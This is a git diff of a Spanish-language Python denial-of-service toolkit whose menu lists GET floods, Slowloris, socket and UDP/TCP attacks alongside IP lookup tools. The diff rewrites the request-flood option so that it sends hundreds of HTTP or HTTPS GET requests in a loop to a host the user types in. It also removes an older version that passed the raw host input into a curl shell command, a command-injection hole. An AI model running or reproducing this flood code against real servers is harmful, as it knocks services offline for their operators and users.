@@ -5,6 +5,7 @@ import socket
 import requests
 import json
 import random
+
 Creator=Fore.BLUE+"74lg0"
 Version=Fore.WHITE+"1.0"
 
@@ -56,7 +57,7 @@ print(Fore.BLUE+"╚═╝░░╚═╝╚═════╝░░░░╚═
 print("~~~~~~~~~~~~~~~~~~~~~~~~~Created by:"+Creator+Fore.RED+"~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 print("~~~~~~~~~~~~~~~~~~~~~~~~~ Version: "+Version+Fore.RED+" ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~")
 print(Fore.WHITE+"\n---------------------- DoS-Denial of Service  -----------------------\n")
-print(Fore.GREEN+"[1]"+Fore.WHITE+"Peticiones curl"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"UDP/TCP")
+print(Fore.GREEN+"[1]"+Fore.WHITE+"Peticiones GET"+Fore.GREEN+"\n[2]"+Fore.WHITE+"Slowloris"+Fore.GREEN+"\n[3]"+Fore.WHITE+"socket"+Fore.GREEN+"\n[4]"+Fore.WHITE+"UDP/TCP")
 print("\n----------------------------- Ip tools  -----------------------------\n")
 print(Fore.GREEN+"[5]"+Fore.WHITE+"Escaneo con Nmap"+Fore.GREEN+"\n[6]"+Fore.WHITE+"Mi ip"+Fore.GREEN+"\n[7]"+Fore.WHITE+"Informacion de mi dispositivo"+Fore.GREEN+"\n[8]"+Fore.WHITE+"Obtener Informacion de una IP"+Fore.GREEN+"\n[9]"+Fore.WHITE+"Informacion de los tipos de DoS")
 
@@ -64,37 +65,34 @@ print(Fore.GREEN+"[5]"+Fore.WHITE+"Escaneo con Nmap"+Fore.GREEN+"\n[6]"+Fore.WHI
 method=input(Fore.WHITE+"~~~~"+Fore.GREEN+">"+Fore.WHITE+" ")
 
 if method == "1":
-    host=input("Ingresa el IP, Host\n~~~~> ")
+    host=input("Ingresa el Host\n~~~~> ")
     treads=input("Ingresa el numero de solicitudes, default("+Fore.BLUE+"500"+Fore.WHITE+")\n~~~~> ")
-    code_response=input("Codigo de respuesta https"+Fore.RED+" 404"+Fore.WHITE+"\nDeseas cambiar el codigo de respuesta"+Fore.GREEN+" y"+Fore.WHITE+"/"+Fore.RED+"n"+Fore.WHITE+"\n~~~~> ")
-    if code_response == "y":
-        actual_response=input("Ingresa una ruta valida para la pagina "+Fore.BLUE+"\nExample: "+Fore.WHITE+"Index.html"+"\n~~~~>")
-        print("Iniciando solicitudes...")
-        time.sleep(1)
+    http_s=int(input(Fore.GREEN+"[1]"+Fore.WHITE+"HTTP\n"+Fore.GREEN+"[2]"+Fore.WHITE+"HTTPS\n"+"~~~~"+Fore.GREEN+">"+Fore.WHITE+" "))
+    if http_s == 1:
         if treads == "":
             for i in range(500):
-                system("curl -s -o /dev/null "+host+"/"+actual_response)
-            print("solicitudes terminadas...")
+                response=requests.get("http://"+host)
+                response
+                print(response)
         else:
             for i in range(int(treads)):
-                system("curl -s -o /dev/null "+host+"/"+actual_response)
-            print("solicitudes terminadas...")
-            
-    
-    if code_response == "n":
-        time.sleep(1)
+                response=requests.get("http://"+host)
+                response
+                print(response)
+    if http_s == 2:
         if treads == "":
             for i in range(500):
-                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
-            print("solicitudes terminadas...")
+                response=requests.get("https://"+host)
+                response
+                print(response)
         else:
-            print("Iniciando solicitudes...")
-            time.sleep(1)
             for i in range(int(treads)):
-                system("curl -s -o /dev/null "+host+"/hack-74lg0-for-educational-use")
-            print("solicitudes terminadas...")
-                
-                
+                response=requests.get("https://"+host)
+                response
+                print(response)
+        
+
+
 elif method == "2":
     ip=input("Ingresa el IP, Host\n~~~~> ")
     port=input("Ingresa el puerto, default("+Fore.BLUE+"80"+Fore.WHITE+")\n~~~~> ")
